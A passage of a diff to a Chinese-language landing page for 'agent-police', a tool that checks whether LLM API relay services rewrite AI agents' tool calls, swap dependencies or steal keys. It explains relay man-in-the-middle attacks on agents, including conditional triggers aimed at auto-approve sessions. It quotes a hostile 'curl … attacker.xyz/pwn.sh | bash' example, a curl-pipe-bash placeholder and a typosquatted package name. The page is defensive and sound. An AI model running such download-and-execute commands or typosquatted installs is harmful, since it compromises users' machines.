@@ -3,22 +3,29 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>agent-police · 检测你的 API 中转站是否在篡改 agent 的工具调用</title>
-<meta name="description" content="在线检测 LLM API 中转站是否改写 agent 的工具调用、替换依赖包或窃取凭证。端点体检与命令自查无需提供密钥。攻击分类来自 arXiv:2604.08407，该论文实测 428 个商用中转站，发现 9 个在注入恶意代码。">
+<title>agent-police · 检测你的 API 中转站有没有偷偷改你的命令</title>
+<meta name="description" content="免费在线检测 LLM API 中转站是否改写 agent 的工具调用、替换依赖包或窃取密钥。不用装东西，不给密钥也能测一部分。攻击分类来自 arXiv:2604.08407，该论文实测 428 个商用中转站，9 个在注入恶意代码。">
 <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
 <link rel="canonical" href="https://security.romaapi.com/">
+<link rel="alternate" hreflang="zh-CN" href="https://security.romaapi.com/">
+<link rel="alternate" hreflang="en" href="https://security.romaapi.com/en">
+<link rel="alternate" hreflang="x-default" href="https://security.romaapi.com/">
 <meta name="author" content="agent-police">
 
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://security.romaapi.com/">
 <meta property="og:site_name" content="agent-police">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:title" content="你的 agent 执行的命令，真的是模型生成的那一条吗？">
-<meta property="og:description" content="第三方 API 中转站终止你的 TLS，能读取并改写模型返回的工具调用参数，而没有任何厂商提供端到端完整性校验。这个工具主动探测你指定的端点，检查它是否真的在改。">
+<meta property="og:locale:alternate" content="en_US">
+<meta property="og:title" content="你的 AI 助手正在执行的命令，真的是它自己写的吗？">
+<meta property="og:description" content="便宜的中转站能看见、也能改写你发出的每一条指令。花 30 秒测一下，你正在用的那个到底干不干净。">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="agent-police · 检测 API 中转站是否篡改工具调用">
-<meta name="twitter:description" content="端点体检与命令自查无需密钥。开源，Apache-2.0。">
+<meta name="twitter:description" content="不给密钥也能测一部分。开源，Apache-2.0。">
 
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap">
 <link rel="stylesheet" href="/static/style.css">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><text y='26' font-size='26'>🛡️</text></svg>">
 
@@ -61,42 +68,50 @@
       "mainEntity": [
         {
           "@type": "Question",
-          "name": "怎么判断我的 API 中转站在不在改我的请求？",
+          "name": "什么是「中转站」？我怎么知道自己用没用？",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "有个五秒钟、对任何中转站都适用的检查：发一条内容为 hi 的请求，看响应里的 prompt_tokens。个位数是正常的；几百上千说明有人在你的请求前面塞了内容，而且在按塞进去的 token 向你计费。要判断响应侧是否被改写，需要发出一条正确答案已知的请求再逐字比对，这正是本站完整探测做的事。"
+            "text": "如果你用的不是 Anthropic 或 OpenAI 官方地址，而是别人给你的一个网址加一把便宜的 key，那就是中转站。判断方法：看你填在工具里的 base_url，只要不是 api.anthropic.com 或 api.openai.com，中间就有一台别人的服务器在转发你的请求。"
           }
         },
         {
           "@type": "Question",
-          "name": "便宜的 Claude 或 GPT API 中转站能不能用？",
+          "name": "怎么判断我的中转站在不在改我的请求？",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "中转站在设计上就是应用层的中间人：它终止你的 TLS、用自己的连接访问上游，因此你的 prompt、工具定义和 API key 对它都是明文，它也能改写你的 agent 随后要执行的工具调用。arXiv:2604.08407 实测 428 个商用中转站，发现 9 个在注入恶意代码、17 个动了研究者的 AWS canary 凭证、1 个把 ETH 私钥里的钱转走了。付费并不更安全：28 个付费中转站里有 1 个在注入。"
+            "text": "有个五秒钟就能做、对任何中转站都适用的检查：发一条「hi」，看响应里的 prompt_tokens。个位数是正常的。几百上千就说明有人在你的请求前面塞了东西——而且在按塞进去的 token 向你计费。"
           }
         },
         {
           "@type": "Question",
-          "name": "扫描结果显示干净，就代表这个中转站安全吗？",
+          "name": "便宜的 Claude / GPT 中转站能不能用？",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "不代表。条件投递（AC-1.b）在触发条件满足之前始终表现正常，而触发逻辑在服务端。论文在真实中转站上观察到的触发条件包括：前 50 次请求先装好人、只对自动批准模式的会话下手、只针对 Rust 或 Go 项目。任何有限次数的黑盒探测都无法证明一个中转站是诚实的。"
+            "text": "中转站在设计上就是应用层的中间人。它终止你的 TLS、用自己的连接访问上游，因此你的 prompt、工具定义、API key 对它都是明文，它也能改写你的 agent 随后要执行的工具调用。需要强调的是，付费不等于安全：论文实测的 28 个付费中转站里同样有注入恶意代码的。"
           }
         },
         {
           "@type": "Question",
-          "name": "检测过程会执行被测端点返回的命令吗？",
+          "name": "扫描结果干净就代表安全吗？",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "绝不会。检测完全在字符串和元数据层面完成：探针请求一条命令，工具比对返回的参数，不运行任何东西。这是与论文中那套在沙箱里执行载荷的测量流水线的刻意区别。"
+            "text": "不代表，报告里每次都会写明。条件投递在触发条件满足之前始终表现正常，而触发逻辑在服务端。任何有限次数的黑盒探测都无法证明一个中转站是诚实的，我们能做的是扩大覆盖面，关不上这个缺口。"
           }
         },
         {
           "@type": "Question",
-          "name": "必须把 API key 交出来才能检测吗？",
+          "name": "agent-police 会执行被测端点返回的命令吗？",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "不是全部功能都需要。端点体检和命令自查完全不需要密钥，可以直接判断端点是谁、跑的什么中转软件、上游响应头是否被剥、是否是无需认证的开放中继。只有 AC-1 和 AC-1.a 需要密钥，因为它们必须拿到真实的模型响应才能比对。如果不希望密钥离开本机，可以用 pip install agent-police 在本地运行完全相同的检测逻辑。"
+            "text": "绝不会。检测完全在字符串和元数据层面。探针请求一条命令，工具比对返回的参数，不运行任何东西。这是和论文里那套测量流水线的刻意区别——论文是在沙箱里执行载荷的。"
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "必须把 API key 交给你们吗？",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "不是全部功能都需要。端点体检和命令自查不需要任何密钥，直接就能跑。只有完整探测需要密钥，因为它必须拿到真实的模型响应才能比对。如果你不想把密钥交给另一台服务器——完全合理——用本地 CLI，密钥不出你的机器。"
           }
         }
       ]
@@ -107,35 +122,109 @@
 </head>
 <body>
 
-<header>
+<div class="topbar">
   <div class="wrap">
-    <div class="brand">agent-police</div>
-    <h1>你的 agent 执行的命令，<br>真的是模型生成的那一条吗？</h1>
-    <p class="lede">
-      如果你通过第三方中转站调用 Claude 或 GPT，那台服务器会终止你的 TLS、再向上游另开一条连接。
-      它能看到并且能改写每一个 JSON 载荷——包括<strong>模型返回的工具调用参数</strong>。
-      目前<strong>没有任何厂商提供端到端完整性校验</strong>，所以客户端无法验证自己执行的命令是否就是模型产出的那一条。
-      这个工具主动探测你指定的端点，检查它是否真的在改。
-    </p>
+    <a class="logo" href="/"><span class="mark"></span>agent-police</a>
+    <nav class="topnav">
+      <a href="/" aria-current="page">在线检测</a>
+      <a href="/gate">客户端闸门</a>
+      <a href="https://github.com/RomaCredit/agent-police">GitHub</a>
+    </nav>
+    <span class="spacer"></span>
+    <div class="langswitch">
+      <a href="/" aria-current="true">中文</a>
+      <a href="/en" hreflang="en">EN</a>
+    </div>
+  </div>
+</div>
 
-    <div class="classes">
-      <div class="cls"><div class="tag">AC-1</div><div class="name">载荷注入</div>
-        <div class="desc">改写返回的工具调用参数，把下载地址换成攻击者的</div></div>
-      <div class="cls"><div class="tag">AC-1.a</div><div class="name">依赖替换</div>
-        <div class="desc">只改包名不改域名，绕过所有基于域名的白名单</div></div>
-      <div class="cls"><div class="tag">AC-1.b</div><div class="name">条件投递</div>
-        <div class="desc">平时装好人，只对特定会话下手</div></div>
-      <div class="cls"><div class="tag">AC-2</div><div class="name">凭证窃取</div>
-        <div class="desc">流量一字不改，静默留存你的密钥和 prompt</div></div>
+<header class="hero">
+  <div class="wrap">
+    <span class="eyebrow"><span class="dot"></span>开源 · Apache-2.0 · 论文实测 428 个中转站，9 个在注入恶意代码</span>
+    <h1>你的 AI 助手正在执行的命令，<br>真的是它自己写的吗？</h1>
+    <p class="lede">
+      便宜的中转站能看见、也能改写你发出的每一条指令。<br>
+      花 30 秒测一下，你正在用的那个到底干不干净。
+    </p>
+    <div class="actions">
+      <a class="btn btn-primary" href="#check">免费检测我的中转站</a>
+      <a class="btn btn-ghost" href="/gate">装到 Claude Code / Codex</a>
     </div>
   </div>
 </header>
 
-<!-- ============ 1. 免密钥检查 ============ -->
+<!-- ============ 三步搞定 ============ -->
 <section>
   <div class="wrap">
+    <div class="section-head">
+      <span class="kicker">怎么用</span>
+      <h2>三步搞定，不需要懂技术</h2>
+      <p>每一步都可以直接复制粘贴。看不懂的名词，下面「名词解释」里都有大白话版本。</p>
+    </div>
+    <div class="steps">
+      <div class="step">
+        <span class="num">01</span>
+        <h3>找到你的中转站地址</h3>
+        <p>就是你填在 Claude Code、Codex 或 Cherry Studio 里的那个网址，通常长得像
+           <code>https://xxx.com/v1</code>。不知道在哪找？看下面的「名词解释」。</p>
+      </div>
+      <div class="step">
+        <span class="num">02</span>
+        <h3>粘进来，点检测</h3>
+        <p>不给 API Key 也能测一部分——看它到底是谁、用的什么软件、是不是谁都能白嫖的开放中继。
+           想测得更全，就用一把<strong>临时 Key</strong>，测完就删。</p>
+      </div>
+      <div class="step">
+        <span class="num">03</span>
+        <h3>看结果，红色就别用了</h3>
+        <p>报告用大白话告诉你：它有没有动过你的命令、有没有碰你的密钥，
+           以及你接下来具体该做什么。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 五秒自查 ============ -->
+<section>
+  <div class="wrap">
+    <div class="section-head">
+      <span class="kicker">先别急着测</span>
+      <h2>有个五秒钟的土办法，先试这个</h2>
+      <p>不用打开任何工具，也不用给密钥。任何中转站都适用。</p>
+    </div>
+    <div class="panel">
+      <div class="body">
+        <p class="sub" style="margin-top:0">
+          给你的中转站发一条只有 <code>hi</code> 两个字母的消息，然后看返回里的
+          <code>prompt_tokens</code> 这个数字：
+        </p>
+        <table>
+          <tr><th style="width:130px">看到的数字</th><th>说明</th></tr>
+          <tr><td><strong style="color:var(--ok)">个位数</strong></td>
+              <td>正常。你发了多少，它就往上游转了多少。</td></tr>
+          <tr><td><strong style="color:var(--danger)">几百、上千</strong></td>
+              <td><strong>有人在你的请求前面塞了东西</strong>，而且这些塞进去的 token 正在按你的账单计费。</td></tr>
+        </table>
+        <div class="cmd" data-copy>把下面这条命令里的网址和 key 换成你自己的，然后粘到终端里回车：
+
+curl -s https://你的中转站/v1/chat/completions \
+  -H "Authorization: Bearer 你的key" \
+  -H "Content-Type: application/json" \
+  -d '{"model":"gpt-4o-mini","messages":[{"role":"user","content":"hi"}]}' \
+  | grep -o '"prompt_tokens":[0-9]*'</div>
+        <p class="hint" style="margin-top:14px">
+          这条命令只是问了一句「hi」，不会改动你的任何东西。
+        </p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 1. 不需要密钥的检查 ============ -->
+<section id="check">
+  <div class="wrap">
     <h2><span class="num">01</span>先做不需要密钥的检查</h2>
-    <p class="sub">
+    <p class="sub" style="margin-bottom:26px">
       这两项不需要你提供任何凭证。建议先做完这里，再决定要不要做完整探测。
     </p>
 
@@ -145,47 +234,51 @@
         <button class="tab" role="tab" aria-selected="false" data-tab="inspect">命令自查</button>
       </div>
 
-      <!-- preflight -->
-      <div data-panel="preflight">
-        <p class="sub" style="margin-bottom:16px">
-          只看端点本身：它是谁、用的什么中转软件、TLS 证书、是否剥掉了上游厂商的响应头、
-          是否是一个无需认证就能用的开放中继。全程不发送你的密钥。
-        </p>
-        <div class="row">
-          <div class="field">
-            <label for="pf-url">端点 base_url</label>
-            <input type="text" id="pf-url" placeholder="https://your-relay.example.com/v1" autocomplete="off" spellcheck="false">
+      <div class="body">
+        <!-- preflight -->
+        <div data-panel="preflight">
+          <p class="sub" style="margin-top:0;margin-bottom:18px">
+            只看端点本身：它是谁、用的什么中转软件、TLS 证书、是否剥掉了上游厂商的响应头、
+            是否是一个无需认证就能用的开放中继。<strong>全程不发送你的密钥。</strong>
+          </p>
+          <div class="row">
+            <div class="field">
+              <label class="label" for="pf-url">端点 base_url</label>
+              <input type="text" id="pf-url" placeholder="https://your-relay.example.com/v1" autocomplete="off" spellcheck="false">
+              <div class="hint">就是你填在 AI 工具里的那个网址，一般以 /v1 结尾。</div>
+            </div>
+            <div class="field">
+              <label class="label" for="pf-wire">接口格式</label>
+              <select id="pf-wire">
+                <option value="anthropic">Anthropic (/v1/messages)</option>
+                <option value="openai">OpenAI (/v1/chat/completions)</option>
+              </select>
+              <div class="hint">不确定就保持默认，测不出来再换另一个。</div>
+            </div>
           </div>
-          <div class="field">
-            <label for="pf-wire">接口格式</label>
-            <select id="pf-wire">
-              <option value="anthropic">Anthropic (/v1/messages)</option>
-              <option value="openai">OpenAI (/v1/chat/completions)</option>
-            </select>
+          <div class="actions" style="justify-content:flex-start">
+            <button class="go" id="pf-run">开始体检</button>
+            <span class="f-meta" id="pf-status"></span>
           </div>
+          <div id="pf-out"></div>
         </div>
-        <div class="actions">
-          <button class="go" id="pf-run">开始体检</button>
-          <span class="f-meta" id="pf-status"></span>
-        </div>
-        <div id="pf-out"></div>
-      </div>
 
-      <!-- inspect -->
-      <div data-panel="inspect" class="hidden">
-        <p class="sub" style="margin-bottom:16px">
-          把 agent 正要执行的命令粘进来。这里没有"正确答案"可比对，所以只能做启发式判断：
-          管道直入 shell、裸 IP、抢注包名、base64 混淆、写入持久化位置等。
-        </p>
-        <div class="field">
-          <label for="ins-cmd">命令</label>
-          <textarea id="ins-cmd" spellcheck="false" placeholder="curl -sSL https://get.example.com/install.sh | bash"></textarea>
+        <!-- inspect -->
+        <div data-panel="inspect" class="hidden">
+          <p class="sub" style="margin-top:0;margin-bottom:18px">
+            把 agent 正要执行的命令粘进来。这里没有「正确答案」可比对，所以只能做启发式判断：
+            管道直入 shell、裸 IP、抢注包名、base64 混淆、写入持久化位置等。
+          </p>
+          <div class="field">
+            <label class="label" for="ins-cmd">命令</label>
+            <textarea id="ins-cmd" spellcheck="false" placeholder="curl -sSL https://get.example.com/install.sh | bash"></textarea>
+          </div>
+          <div class="actions" style="justify-content:flex-start">
+            <button class="go" id="ins-run">检查这条命令</button>
+            <button class="ghost" id="ins-demo">填入示例</button>
+          </div>
+          <div id="ins-out"></div>
         </div>
-        <div class="actions">
-          <button class="go" id="ins-run">检查这条命令</button>
-          <button class="ghost" id="ins-demo">填入示例</button>
-        </div>
-        <div id="ins-out"></div>
       </div>
     </div>
   </div>
@@ -195,10 +288,10 @@
 <section>
   <div class="wrap">
     <h2><span class="num">02</span>完整探测（需要该端点的 API key）</h2>
-    <p class="sub">
+    <p class="sub" style="margin-bottom:22px">
       AC-1 和 AC-1.a 只能主动探测：我们发出一条<strong>正确答案完全已知</strong>的请求——
       要求模型原样返回一条指定命令——然后逐字比对返回的工具调用。任何差异都是证据。
-      载荷里带一次性 nonce，因此"同一个替换目标在多个不同 nonce 下反复出现"可以把蓄意改写和模型噪声区分开。
+      载荷里带一次性 nonce，因此「同一个替换目标在多个不同 nonce 下反复出现」可以把蓄意改写和模型噪声区分开。
     </p>
 
     <div class="notice">
@@ -215,193 +308,210 @@
     </div>
 
     <div class="panel">
-      <div class="row">
-        <div class="field">
-          <label for="au-url">端点 base_url</label>
-          <input type="text" id="au-url" placeholder="https://your-relay.example.com/v1" autocomplete="off" spellcheck="false">
+      <div class="body">
+        <div class="row">
+          <div class="field">
+            <label class="label" for="au-url">端点 base_url</label>
+            <input type="text" id="au-url" placeholder="https://your-relay.example.com/v1" autocomplete="off" spellcheck="false">
+          </div>
+          <div class="field">
+            <label class="label" for="au-model">模型 id</label>
+            <input type="text" id="au-model" placeholder="claude-sonnet-4-5" autocomplete="off" spellcheck="false">
+          </div>
+        </div>
+        <div class="row">
+          <div class="field">
+            <label class="label" for="au-wire">接口格式</label>
+            <select id="au-wire">
+              <option value="anthropic">Anthropic (/v1/messages)</option>
+              <option value="openai">OpenAI (/v1/chat/completions)</option>
+            </select>
+          </div>
+          <div class="field">
+            <label class="label" for="au-mode">探测强度</label>
+            <select id="au-mode">
+              <option value="quick">快速 · 仅 AC-1 · 约 7 次请求</option>
+              <option value="standard" selected>标准 · AC-1 + AC-1.a · 约 28 次请求</option>
+              <option value="deep">深度 · 全部 + canary · 两种会话指纹 · 约 72 次请求</option>
+            </select>
+          </div>
         </div>
         <div class="field">
-          <label for="au-model">模型 id</label>
-          <input type="text" id="au-model" placeholder="claude-sonnet-4-5" autocomplete="off" spellcheck="false">
+          <label class="label" for="au-key">该端点的 API key</label>
+          <input type="password" id="au-key" placeholder="sk-..." autocomplete="off" spellcheck="false">
+          <div class="hint">请求会消耗这把 key 的额度。强烈建议新建一把临时 key，测完即删。</div>
         </div>
-      </div>
-      <div class="row">
-        <div class="field">
-          <label for="au-wire">接口格式</label>
-          <select id="au-wire">
-            <option value="anthropic">Anthropic (/v1/messages)</option>
-            <option value="openai">OpenAI (/v1/chat/completions)</option>
-          </select>
+        <div class="actions" style="justify-content:flex-start">
+          <button class="go" id="au-run">开始探测</button>
+          <span class="f-meta" id="au-status"></span>
         </div>
-        <div class="field">
-          <label for="au-mode">探测强度</label>
-          <select id="au-mode">
-            <option value="quick">快速 · 仅 AC-1 · 约 7 次请求</option>
-            <option value="standard" selected>标准 · AC-1 + AC-1.a · 约 28 次请求</option>
-            <option value="deep">深度 · 全部 + canary · 两种会话指纹 · 约 72 次请求</option>
-          </select>
+
+        <div class="progress hidden" id="au-progress">
+          <div class="bar"><i style="width:0%"></i></div>
+          <div class="label"></div>
         </div>
-      </div>
-      <div class="field">
-        <label for="au-key">该端点的 API key</label>
-        <input type="password" id="au-key" placeholder="sk-..." autocomplete="off" spellcheck="false">
-        <div class="hint">请求会消耗这把 key 的额度。强烈建议新建一把临时 key，测完即删。</div>
-      </div>
-      <div class="actions">
-        <button class="go" id="au-run">开始探测</button>
-        <span class="f-meta" id="au-status"></span>
-      </div>
-
-      <div class="progress hidden" id="au-progress">
-        <div class="bar"><i style="width:0%"></i></div>
-        <div class="label"></div>
-      </div>
-      <div id="au-out"></div>
-    </div>
-  </div>
-</section>
-
-<!-- ============ 3. 结果解读 ============ -->
-<section>
-  <div class="wrap">
-    <h2><span class="num">03</span>这四类攻击到底长什么样</h2>
-    <p class="sub">
-      分类与示例来自 <a href="https://arxiv.org/abs/2604.08407" rel="noopener">arXiv:2604.08407</a>
-      《Your Agent Is Mine》。该论文实测 428 个商用中转站，发现 9 个在注入恶意代码、17 个动了研究者的 AWS canary 凭证、1 个把 ETH 私钥里的钱转走了。
-    </p>
-
-    <div class="explain">
-      <div class="ex">
-        <h4><span>AC-1</span>响应侧载荷注入</h4>
-        <p>模型返回工具调用之后、你的 agent 收到之前，中转站改写参数。改完仍然是合法 JSON、仍然符合 schema，下游任何检查都不会报错。</p>
-<pre><span class="c"># 模型实际产出</span>
-{"name":"Bash","arguments":{"command":"curl -sSL <span class="ins">https://get.example.com/cli.sh</span> | bash"}}
-<span class="c"># 你的 agent 收到</span>
-{"name":"Bash","arguments":{"command":"curl -sSL <span class="del">https://attacker.xyz/pwn.sh</span> | bash"}}</pre>
-      </div>
-
-      <div class="ex">
-        <h4><span>AC-1.a</span>依赖定向注入</h4>
-        <p>不碰域名，只换包名。命令行其余部分一字不动，依然从官方registry 安装，所以基于域名的白名单完全不触发。更糟的是被替换的依赖会缓存在本地，之后每个会话都会重新导入——这是持久化的后门。</p>
-<pre><span class="c"># 模型实际产出</span>
-python -m pip install <span class="ins">requests</span> flask pyyaml
-<span class="c"># 你的 agent 收到</span>
-python -m pip install <span class="del">reqeusts</span> flask pyyaml   <span class="c">← 相邻两字母交换</span></pre>
-      </div>
-
-      <div class="ex">
-        <h4><span>AC-1.b</span>条件投递</h4>
-        <p>论文在真实中转站上观察到的触发条件：<strong>前 50 次请求先装好人</strong>、<strong>只对自动批准（YOLO）模式的会话下手</strong>、<strong>只针对 Rust / Go 项目</strong>。因为触发逻辑在服务端且不可见，<strong>任何有限次数的黑盒探测都无法证明一个端点是干净的</strong>。本站的"深度"模式会跨多种会话指纹探测来扩大覆盖，但这依然只是扩大覆盖，不是证明。</p>
-      </div>
-
-      <div class="ex">
-        <h4><span>AC-2</span>被动凭证窃取</h4>
-        <p>流量一个字节都不改，只是把看到的密钥抄走。因为响应没有任何变化，<strong>在请求时刻无法检测</strong>，连厂商的响应签名方案也救不了——泄露发生在请求路径上。唯一可行的办法是种 canary：在探针流量里植入只存在于此处的假凭证，然后等着看有没有人来用它。</p>
-        <p>深度模式会在四个位置植入 canary：system prompt、用户消息、工具返回结果、以及工具定义的 description。命中结果可能几小时到几天后才出现——被窃取的凭证通常要先验证、转卖，才会被使用。</p>
+        <div id="au-out"></div>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ============ 4. CLI ============ -->
+<!-- ============ 能查出什么 ============ -->
 <section>
   <div class="wrap">
-    <h2><span class="num">04</span>不想把密钥交出来？用本地 CLI</h2>
-    <p class="sub">
-      完全相同的检测逻辑，在你自己的机器上跑，密钥不出本机。这也是我们更推荐的方式。
-    </p>
-<div class="notice calm">
-      <strong>这个包是开源的，发布链路里没有任何长期凭证。</strong>
-      <a href="https://pypi.org/project/agent-police/" rel="noopener">PyPI</a> 上的包由
-      <a href="https://github.com/RomaCredit/agent-police/blob/main/.github/workflows/release.yml" rel="noopener">GitHub Actions</a>
-      通过 PyPI trusted publishing (OIDC) 发布——这个项目<strong>不存在 API token</strong>，
-      没有东西可泄露或需要轮换。每次发布都来自一个版本号与 <code>pyproject.toml</code>
-      一致的 tag，且先通过 3.10–3.14 全部版本的测试。
-      源码：<a href="https://github.com/RomaCredit/agent-police" rel="noopener">github.com/RomaCredit/agent-police</a>
+    <div class="section-head">
+      <span class="kicker">检测范围</span>
+      <h2>能查出四类手法</h2>
+      <p>分类和实测数据来自论文 arXiv:2604.08407。</p>
     </div>
-<pre class="cmd"><span class="c"># 安装</span>
-pip install agent-police
-
-<span class="c"># 标准审计（密钥会交互式询问，不回显、不进 shell history）</span>
-agent-police audit https://your-relay.example.com/v1 \
-  --model claude-sonnet-4-5 --wire anthropic --repeats 3
-
-<span class="c"># 针对 AC-1.b 的长时扫描：跨工具名、项目语言、自动批准状态、热身深度</span>
-agent-police campaign https://your-relay.example.com/v1 \
-  --model claude-sonnet-4-5 \
-  --langs rust,go,python --warmups 0,10,50 --rate 20
-
-<span class="c"># 不联网，只看一条命令</span>
-agent-police inspect "curl -sSL https://get.example.com/i.sh | bash"</pre>
-    <p class="sub" style="margin:0">
-      CLI 默认把 canary 指向本站收集器，并在发出携带它的探针<strong>之前</strong>完成注册——
-      收集器只会记录它认识的 token。注册失败时运行结果会明确标记
-      <code>AC-2 COVERAGE LOST</code>，而不是假装有覆盖。
-      用运行时打印的 audit id 回查：<code>agent-police canary check --audit-id cli-…</code>。
-      <code>--no-canary</code> 可完全离线运行，<code>agent-police serve</code> 可自建收集器。
-    </p>
+    <div class="classes">
+      <div class="cls"><div class="tag">AC-1</div><div class="name">载荷注入</div>
+        <div class="desc">改写返回的工具调用参数，把下载地址换成攻击者的</div></div>
+      <div class="cls"><div class="tag">AC-1.a</div><div class="name">依赖替换</div>
+        <div class="desc">只改包名不改域名，绕过所有基于域名的白名单</div></div>
+      <div class="cls"><div class="tag">AC-1.b</div><div class="name">条件投递</div>
+        <div class="desc">平时装好人，只对特定会话下手</div></div>
+      <div class="cls"><div class="tag">AC-2</div><div class="name">凭证窃取</div>
+        <div class="desc">流量一字不改，静默留存你的密钥和 prompt</div></div>
+    </div>
   </div>
 </section>
 
-<!-- ============ 5. 常见问题 ============ -->
+<!-- ============ 名词解释 ============ -->
 <section>
   <div class="wrap">
-    <h2><span class="num">05</span>常见问题</h2>
+    <div class="section-head">
+      <span class="kicker">看不懂？</span>
+      <h2>名词解释</h2>
+      <p>这一节是给第一次接触这件事的人写的。</p>
+    </div>
+    <div class="faq">
+      <details>
+        <summary>什么是「中转站」？我怎么知道自己用没用？</summary>
+        <div class="answer">
+          <p>如果你用的不是 Anthropic 或 OpenAI 的官方地址，而是别人给你的一个网址加一把便宜的 key，那就是中转站。</p>
+          <p><strong>判断方法：</strong>看你填在工具里的 <code>base_url</code>。只要它不是
+             <code>api.anthropic.com</code> 或 <code>api.openai.com</code>，
+             中间就有一台<strong>别人的服务器</strong>在转发你的请求。</p>
+        </div>
+      </details>
+      <details>
+        <summary>base_url 在哪里找？</summary>
+        <div class="answer">
+          <p>Claude Code：环境变量 <code>ANTHROPIC_BASE_URL</code>，或 <code>~/.claude/settings.json</code>。</p>
+          <p>Codex：<code>~/.codex/config.toml</code> 里的 <code>base_url</code>。</p>
+          <p>Cherry Studio / NextChat / 沉浸式翻译等：设置界面里的「API 地址」「接口地址」「反代地址」。</p>
+        </div>
+      </details>
+      <details>
+        <summary>为什么中转站能看到我的东西？它不是加密的吗？</summary>
+        <div class="answer">
+          <p>HTTPS 只保证「你到那台服务器」这一段是加密的。中转站就是那台服务器——加密到它为止就解开了，
+             然后它再用<strong>自己的连接</strong>去访问真正的 Anthropic 或 OpenAI。</p>
+          <p>所以在它眼里，你的 prompt、你的文件内容、你的 API key，全是明文；
+             模型返回给你的内容，它也能在转发前改掉。</p>
+        </div>
+      </details>
+      <details>
+        <summary>「工具调用」是什么？改了会怎样？</summary>
+        <div class="answer">
+          <p>当 AI 助手要执行命令、装依赖、改文件时，模型会返回一段结构化的「工具调用」，里面写着要执行什么。
+             你的 agent 拿到它就去执行。</p>
+          <p>如果中转站把里面的下载地址从官方换成攻击者的，<strong>你的 agent 会照做</strong>，
+             而命令看起来还是正常的那一条。</p>
+        </div>
+      </details>
+      <details>
+        <summary>什么是「临时 key」？怎么弄一把？</summary>
+        <div class="answer">
+          <p>在你的中转站后台新建一把 key，额度设小一点，测完就删掉。这样即使这把 key 泄露了，损失也是有限的、可控的。</p>
+          <p>不要用你平时在用的那把主 key 来做测试。</p>
+        </div>
+      </details>
+    </div>
+  </div>
+</section>
 
-    <div class="explain">
-      <div class="ex">
-        <h4>怎么判断我的 API 中转站在不在改我的请求？</h4>
-        <p>
-          有个五秒钟、对任何中转站都适用的检查：<strong>发一条内容为 <code>hi</code> 的请求，
-          看响应里的 <code>prompt_tokens</code>。</strong>
-          个位数是正常的；几百上千说明有人在你的请求前面塞了内容，而且在按塞进去的 token 向你计费。
-        </p>
-        <p style="margin:0">
-          要判断<strong>响应侧</strong>是否被改写，必须发出一条正确答案已知的请求再逐字比对——
-          这正是本页「完整探测」做的事。
-        </p>
+<!-- ============ FAQ ============ -->
+<section>
+  <div class="wrap">
+    <div class="section-head">
+      <span class="kicker">常见问题</span>
+      <h2>你可能想先问清楚的</h2>
+    </div>
+    <div class="faq">
+      <details open>
+        <summary>怎么判断我的中转站在不在改我的请求？</summary>
+        <div class="answer">
+          <p>有个五秒钟就能做、对任何中转站都适用的检查：<strong>发一条 <code>hi</code>，看响应里的 <code>prompt_tokens</code>。</strong></p>
+          <p>个位数是正常的。几百上千就说明有人在你的请求前面塞了东西——而且在按塞进去的 token 向你计费。</p>
+        </div>
+      </details>
+      <details>
+        <summary>便宜的 Claude / GPT 中转站能不能用？</summary>
+        <div class="answer">
+          <p>中转站在设计上就是应用层的中间人。它终止你的 TLS、用自己的连接访问上游，
+             因此你的 prompt、工具定义、API key 对它都是明文，它也能改写你的 agent 随后要执行的工具调用。</p>
+          <p>需要强调的是，<strong>付费不等于安全</strong>：论文实测的 28 个付费中转站里同样有注入恶意代码的。</p>
+        </div>
+      </details>
+      <details>
+        <summary>扫描结果干净就代表安全吗？</summary>
+        <div class="answer">
+          <p><strong>不代表，报告里每次都会写明。</strong>条件投递在触发条件满足之前始终表现正常，而触发逻辑在服务端。</p>
+          <p>任何有限次数的黑盒探测都<strong>无法证明</strong>一个中转站是诚实的。我们能做的是扩大覆盖面，关不上这个缺口。</p>
+        </div>
+      </details>
+      <details>
+        <summary>agent-police 会执行被测端点返回的命令吗？</summary>
+        <div class="answer">
+          <p><strong>绝不会。</strong>检测完全在字符串和元数据层面。探针请求一条命令，工具比对返回的参数，不运行任何东西。</p>
+          <p>这是和论文里那套测量流水线的刻意区别——论文是在沙箱里执行载荷的。</p>
+        </div>
+      </details>
+      <details>
+        <summary>必须把 API key 交给你们吗？</summary>
+        <div class="answer">
+          <p>不是全部功能都需要。<strong>端点体检和命令自查不需要任何密钥</strong>，直接就能跑。</p>
+          <p>只有完整探测需要密钥，因为它必须拿到真实的模型响应才能比对。
+             如果你不想把密钥交给另一台服务器——完全合理——用本地 CLI，密钥不出你的机器。</p>
+        </div>
+      </details>
+      <details>
+        <summary>我想让密钥完全不出本机，怎么办？</summary>
+        <div class="answer">
+          <p>用命令行版本：</p>
+          <div class="cmd" data-copy>pip install agent-police
+agent-police audit https://你的中转站/v1 --model claude-sonnet-4-5</div>
+          <p style="margin-top:12px">密钥会交互式询问，不回显、不进 shell 历史。</p>
+        </div>
+      </details>
+    </div>
+  </div>
+</section>
+
+<!-- ============ CLI + 闸门 ============ -->
+<section>
+  <div class="wrap">
+    <div class="section-head">
+      <span class="kicker">两个工具</span>
+      <h2>测完之后呢？</h2>
+      <p>检测回答「这个中转站干不干净」。闸门回答「这条命令该不该执行」。</p>
+    </div>
+    <div class="steps" style="grid-template-columns:1fr 1fr">
+      <div class="step">
